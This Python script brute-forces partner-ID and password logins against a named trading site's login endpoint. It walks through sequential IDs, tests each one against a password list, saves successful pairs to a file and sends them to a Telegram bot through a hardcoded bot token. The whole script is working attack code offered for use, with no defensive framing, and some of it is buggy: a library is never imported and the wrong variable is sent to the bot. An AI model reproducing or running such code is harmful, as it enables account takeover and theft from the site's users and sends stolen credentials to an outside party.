import requests,time,sys,os,random
from requests import ConnectionError
url1 = "https://trade.topbos.com/trade/pwdLogin.do"

def ste(use):
#    token = "5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs"
    token = "5162664077:AAFAjX2fJJiZUrpFroio2MaKJqsqqDBh7F8"
    idd = 1380298324
    bot = telepot.Bot(token)
    bot.sendMessage(idd,use)


def search(id,pw):
          for i in range(1000):
             id +=1
             for line in pw:
                 pwd = line.strip()
                 try:
                     da={'partnerId':id,'pwd':pwd}
                     resp = requests.post(url1,data=da)
                     if 'S' in str(resp.text):
                          print(id,pwd,'Found Fuck')
                          usp = id,':',pw
                          ste(usp)
                          r = open('hasilnew.txt','a')
                          r.write('{} : {}\n'.format(id,pwd))
                          r.close()
                     else:
                          print(id,pwd,"wrong")
                 except ConnectionError:
                      time.sleep(3)
def program():
           python = sys.executable
           os.execl(python, python, * sys.argv)
           curdir = os.getcwd()
def main():
       put='1'
       if put == '1' or put == '01':
          di=int(random.randint(10,1500))
#             user=int("%000" % (di))
          his=open('history.txt','r').read()
          if str(di) in his.split():
                 print('[=]',di,'Sudah digunakan')
                 program()
          else:
                 user=int("%s000" % (di))
                 pasw=open('fin.txt','r').readlines()
                 search(user,pasw)
                 hs=open('history.txt','a')
                 hs.write('{}\n'.format(di))
                 hs.close()
                 program()
main()
